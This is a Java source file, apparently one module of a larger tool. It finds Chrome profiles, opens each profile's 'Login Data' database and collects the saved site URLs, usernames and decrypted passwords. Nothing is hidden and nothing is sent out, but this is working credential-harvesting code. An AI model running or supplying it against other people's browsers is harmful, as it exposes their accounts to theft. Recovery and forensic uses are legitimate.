package random.chrom;

import org.json.JSONObject;
import random.util.OperatingSystem;

import java.io.File;
import java.io.IOException;
import java.lang.invoke.MethodHandles;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.logging.Level;
import java.util.logging.Logger;

public class ChromeDatabase {

	private static final Logger LOG = Logger.getLogger(MethodHandles.lookup().lookupClass().getName());
	private static final String LOGIN_QUERY = "SELECT action_url, username_value, password_value FROM logins";

	private final SqliteDB sqliteDB;

	public ChromeDatabase() {
		sqliteDB = new SqliteDB();
	}

	public Map<String, List<ChromeAccountEntry>> getProfiles() throws Exception {
		List<ChromeProfile> chromeProfiles = getChromeProfiles();
		Path chromeInstallPath = getChromeInstallPath();

		Map<String, List<ChromeAccountEntry>> profiles = new HashMap<>();
		for (ChromeProfile profile : chromeProfiles) {
			File loginDataFile = new File(chromeInstallPath.toString() + File.separator + profile.getProfileName(), "Login Data");
			profiles.put(profile.getName(), getChromeAccountsFromDatabaseFile(loginDataFile));
		}

		if (chromeProfiles.isEmpty() || profiles.isEmpty()) {
			throw new InstantiationException("No chrome profiles found!");
		}
		return profiles;
	}

	private List<ChromeProfile> getChromeProfiles() throws Exception {
		Path chromeInstallPath = getChromeInstallPath();
		File chromeInfo = new File(chromeInstallPath.toString(), "Local State");
		List<ChromeProfile> chromeProfiles;
		final String[] infoLines = Files.readAllLines(Paths.get(chromeInfo.toURI())).toArray(new String[]{});
		switch (OperatingSystem.getOperatingSystem()) {
			case WINDOWS:
				chromeProfiles = readProfiles(infoLines);
				break;
			case MAC:
				final String line = infoLines[0];
				final String[] lines = line.split("\\{|\\}");
				chromeProfiles = readProfiles(lines);
				break;
			default:
				throw new Exception(System.getProperty("os.name") + " is not supported by this application!");
		}
		return chromeProfiles;
	}

	private ChromeAccountEntry getChromeAccount(ResultSet results) {
		try {
			String address = results.getString("action_url");
			String username = results.getString("username_value");
			String password = ChromeSecurity.getPassword(results);
			return new ChromeAccountEntry(username, password, address);
		} catch (Exception e) {
			LOG.log(Level.SEVERE, e.getMessage(), e);
		}
		return null;
	}

	private List<ChromeAccountEntry> getChromeAccountsFromDatabaseFile(File dbFile) throws Exception {
		try (Connection connection = sqliteDB.connectToTempDB(dbFile, "CHROME_LOGIN_")) {
			return getChromeAccountsFromConnection(connection);
		} catch (Exception e) {
			return Collections.emptyList();
		}
	}

	private List<ChromeAccountEntry> getChromeAccountsFromConnection(Connection connection) throws Exception {
		try {
			if (connection.isClosed()) {
				throw new IOException("Connection to database has been terminated! Cannot fetch accounts.");
			}
		} catch (SQLException e) {
			throw new IOException("Connection status to the database could not be determined. Has chrome updated?");
		}
		List<ChromeAccountEntry> accounts = new ArrayList<>();
		try (ResultSet resultSet = connection.createStatement().executeQuery(LOGIN_QUERY)) {
			while (resultSet.next()) {
				accounts.add(getChromeAccount(resultSet));
			}
		} catch (SQLException e) {
			throw new IOException("Error reading database. Is the file corrupted?");
		}
		return accounts;
	}

	private Path getChromeInstallPath() throws Exception {
		final OperatingSystem os = OperatingSystem.getOperatingSystem();
		if (os == OperatingSystem.UNKNOWN) {
			throw new Exception(System.getProperty("os.name") + " is not supported by this application!");
		}
		Path chromeInstall = Paths.get(os.getChromePath());
		if (Files.notExists(chromeInstall)) {
			throw new IOException("Google chrome installation not found.");
		}
		return chromeInstall;
	}

	private List<ChromeProfile> readProfiles(String[] profilesLines) {
		List<ChromeProfile> profiles = new ArrayList<>();
		String profilesLine = profilesLines[0];
		JSONObject jsonObject = new JSONObject(profilesLine);
		JSONObject profile = (JSONObject) jsonObject.get("profile");
		JSONObject infoCache = (JSONObject) profile.get("info_cache");

		Set<String> keys = infoCache.keySet();
		for (String key : keys) {
			JSONObject userProfile = (JSONObject) infoCache.get(key);
			String name = (String) userProfile.get("user_name");
			String gaiaName = (String) userProfile.get("gaia_name");
			profiles.add(new ChromeProfile(name, gaiaName, key));
		}
		return profiles;
	}

}
